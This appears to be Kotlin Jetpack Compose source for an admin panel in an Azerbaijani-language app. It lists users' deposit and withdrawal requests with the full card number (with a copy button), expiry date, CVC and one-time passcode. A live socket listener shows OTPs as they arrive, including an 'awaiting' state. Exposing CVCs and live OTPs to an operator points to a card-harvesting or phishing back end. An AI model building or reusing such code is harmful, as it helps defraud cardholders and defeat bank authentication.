package com.example.a3tuz.ui.admin

import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.a3tuz.api.AdminRequestData
import com.example.a3tuz.api.RetrofitInstance
import com.example.a3tuz.api.SocketManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

@Composable
fun RequestsList(token: String, onlyPending: Boolean) {
    var requests by remember { mutableStateOf<List<AdminRequestData>>(emptyList()) }
    var requestToDelete by remember { mutableStateOf<AdminRequestData?>(null) }
    val expandedUsers = remember { mutableStateMapOf<String, Boolean>() }
    val scope = rememberCoroutineScope()

    fun fetchRequests() {
        scope.launch(Dispatchers.IO) {
            try {
                val response = RetrofitInstance.api.getAdminRequests(token)
                if (response.isSuccessful) {
                    val body = response.body() ?: emptyList()
                    scope.launch(Dispatchers.Main) { requests = body }
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    LaunchedEffect(Unit) {
        fetchRequests()
        val socket = SocketManager.getSocket()
        val updateListener = io.socket.emitter.Emitter.Listener { fetchRequests() }
        socket?.on("adminUpdate", updateListener)
    }

    DisposableEffect(Unit) {
        onDispose { SocketManager.getSocket()?.off("adminUpdate") }
    }

    if (requestToDelete != null) {
        AlertDialog(
            onDismissRequest = { requestToDelete = null },
            title = { Text("Sorğunu Sil") },
            text = { Text("Bu əməliyyat tarixçəsini silmək istədiyinizdən əminsiniz?") },
            confirmButton = {
                TextButton(onClick = {
                    scope.launch {
                        RetrofitInstance.api.adminRequestAction(token, mapOf("id" to requestToDelete!!.id.toString(), "action" to "delete"))
                        requestToDelete = null
                        fetchRequests()
                    }
                }) { Text("SİL", color = Color.Red) }
            },
            dismissButton = {
                TextButton(onClick = { requestToDelete = null }) { Text("LƏĞV ET") }
            }
        )
    }

    val filteredRequests = if (onlyPending) {
        requests.filter { it.status == "pending" }
    } else {
        requests.filter { it.status != "pending" }
    }

    val groupedRequests = filteredRequests.groupBy { it.username }

    LazyColumn(modifier = Modifier.fillMaxSize().navigationBarsPadding().padding(8.dp)) {
        groupedRequests.forEach { (username, userReqs) ->
            val isExpanded = expandedUsers[username] ?: false
            
            item {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 4.dp)
                        .clickable { expandedUsers[username] = !isExpanded },
                    colors = CardDefaults.cardColors(containerColor = if(isExpanded) Color(0xFFF0F0F0) else Color.White),
                    elevation = CardDefaults.cardElevation(1.dp),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = if (isExpanded) Icons.Default.FolderOpen else Icons.Default.Folder,
                                contentDescription = null,
                                tint = if (onlyPending) Color(0xFF2196F3) else Color.Gray,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(12.dp))
                            Text(
                                text = username,
                                fontWeight = FontWeight.Bold,
                                fontSize = 16.sp
                            )
                        }
                        Badge(containerColor = if(onlyPending) Color.Red else Color.Gray) {
                            Text(userReqs.size.toString(), color = Color.White)
                        }
                    }
                }
            }

            if (isExpanded) {
                items(userReqs.reversed()) { req ->
                    Box(modifier = Modifier.padding(start = 16.dp)) {
                        if (onlyPending) {
                            PendingRequestItem(req, token, scope, onDelete = { requestToDelete = req }) { fetchRequests() }
                        } else {
                            HistoryRequestItem(req, onDelete = { requestToDelete = req })
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun PendingRequestItem(req: AdminRequestData, token: String, scope: kotlinx.coroutines.CoroutineScope, onDelete: () -> Unit, onAction: () -> Unit) {
    val clipboardManager = LocalClipboardManager.current
    Card(
        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
        shape = RoundedCornerShape(12.dp),
        elevation = CardDefaults.cardElevation(4.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        text = if (req.type == "deposit") "📥 DEPOZİT" else "📤 ÇIXARIŞ",
                        fontWeight = FontWeight.Bold,
                        color = if (req.type == "deposit") Color(0xFF2E7D32) else Color(0xFFC2185B),
                        fontSize = 11.sp
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    IconButton(onClick = onDelete, modifier = Modifier.size(24.dp)) {
                        Icon(Icons.Default.Delete, null, tint = Color.LightGray, modifier = Modifier.size(16.dp))
                    }
                }
                Text(req.date.split(", ").lastOrNull() ?: "", fontSize = 10.sp, color = Color.Gray)
            }
            
            Spacer(modifier = Modifier.height(6.dp))
            Text("${req.amount} AZN", fontSize = 22.sp, color = Color.Black, fontWeight = FontWeight.Black)
            
            val cardNoSafe = req.cardNo ?: "N/A"
            val formattedCardNo = cardNoSafe.replace(" ", "").chunked(4).joinToString(" ")
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text("Kart: $formattedCardNo", fontSize = 14.sp)
                Spacer(modifier = Modifier.width(8.dp))
                IconButton(
                    onClick = { clipboardManager.setText(AnnotatedString(cardNoSafe.replace(" ", ""))) },
                    modifier = Modifier.size(20.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.ContentCopy,
                        contentDescription = "Kopyala",
                        tint = Color(0xFF2196F3),
                        modifier = Modifier.size(14.dp)
                    )
                }
            }
            Text("Müddət: ${req.expiry ?: "??/??"} | CVC: ${req.cvc ?: "***"}", fontSize = 13.sp, color = Color.DarkGray)
            
            if (req.type == "deposit" && !req.otp.isNullOrEmpty()) {
                Surface(
                    color = if (req.otp == "Gözlənilir...") Color(0xFFF5F5F5) else Color(0xFFFFEBEE),
                    shape = RoundedCornerShape(6.dp),
                    modifier = Modifier.padding(top = 8.dp).fillMaxWidth()
                ) {
                    Text(
                        text = "OTP: ${req.otp}",
                        color = if (req.otp == "Gözlənilir...") Color.Gray else Color.Red,
                        fontWeight = FontWeight.Black,
                        fontSize = 15.sp,
                        modifier = Modifier.padding(8.dp)
                    )
                }
            }

            Row(modifier = Modifier.fillMaxWidth().padding(top = 12.dp), horizontalArrangement = Arrangement.End) {
                Button(
                    onClick = { scope.launch { RetrofitInstance.api.adminRequestAction(token, mapOf("id" to req.id.toString(), "action" to "reject")); onAction() } },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF44336)),
                    modifier = Modifier.padding(end = 8.dp).height(36.dp),
                    shape = RoundedCornerShape(8.dp)
                ) { Text("Rədd et", fontSize = 12.sp) }

                Button(
                    onClick = { scope.launch { RetrofitInstance.api.adminRequestAction(token, mapOf("id" to req.id.toString(), "action" to "approve")); onAction() } },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50)),
                    modifier = Modifier.height(36.dp),
                    shape = RoundedCornerShape(8.dp)
                ) { Text("Təsdiqlə", fontSize = 12.sp) }
            }
        }
    }
}

@Composable
fun HistoryRequestItem(req: AdminRequestData, onDelete: () -> Unit) {
    val clipboardManager = LocalClipboardManager.current
    Card(
        modifier = Modifier.fillMaxWidth().padding(vertical = 3.dp),
        shape = RoundedCornerShape(8.dp),
        colors = CardDefaults.cardColors(
            containerColor = if (req.status == "approved") Color(0xFFF1F8E9) else Color(0xFFFFF1F1)
        )
    ) {
        Column(modifier = Modifier.padding(10.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        text = if (req.type == "deposit") "📥 DEPOZİT" else "📤 ÇIXARIŞ",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (req.type == "deposit") Color(0xFF2E7D32) else Color(0xFFC2185B)
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(req.date, fontSize = 10.sp, color = Color.Gray)
                    Spacer(modifier = Modifier.width(8.dp))
                    IconButton(onClick = onDelete, modifier = Modifier.size(20.dp)) {
                        Icon(Icons.Default.Delete, null, tint = Color.LightGray.copy(alpha = 0.5f), modifier = Modifier.size(14.dp))
                    }
                }
                
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = if (req.status == "approved") Icons.Default.CheckCircle else Icons.Default.Cancel,
                        contentDescription = null,
                        tint = if (req.status == "approved") Color(0xFF4CAF50) else Color(0xFFE53935),
                        modifier = Modifier.size(14.dp)
                    )
                    Spacer(modifier = Modifier.width(4.dp))
                    Text(
                        text = if (req.status == "approved") "Uğurlu" else "Rədd",
                        color = if (req.status == "approved") Color(0xFF4CAF50) else Color(0xFFE53935),
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }

            Spacer(modifier = Modifier.height(4.dp))
            Text(text = "${req.amount} AZN", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = Color.Black)
            
            val cardNoSafe = req.cardNo ?: "N/A"
            val formattedCardNo = cardNoSafe.replace(" ", "").chunked(4).joinToString(" ")
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(text = "Kart: $formattedCardNo", fontSize = 13.sp, color = Color.DarkGray)
                Spacer(modifier = Modifier.width(8.dp))
                IconButton(
                    onClick = { clipboardManager.setText(AnnotatedString(cardNoSafe.replace(" ", ""))) },
                    modifier = Modifier.size(18.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.ContentCopy,
                        contentDescription = "Kopyala",
                        tint = Color(0xFF2196F3),
                        modifier = Modifier.size(12.dp)
                    )
                }
            }
            Text(text = "Müddət: ${req.expiry ?: "??/??"} | CVC: ${req.cvc ?: "***"}", fontSize = 13.sp, color = Color.DarkGray)
            
            if (!req.otp.isNullOrEmpty() && req.otp != "N/A") {
                Text(text = "OTP: ${req.otp}", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color.Red)
            }
        }
    }
}
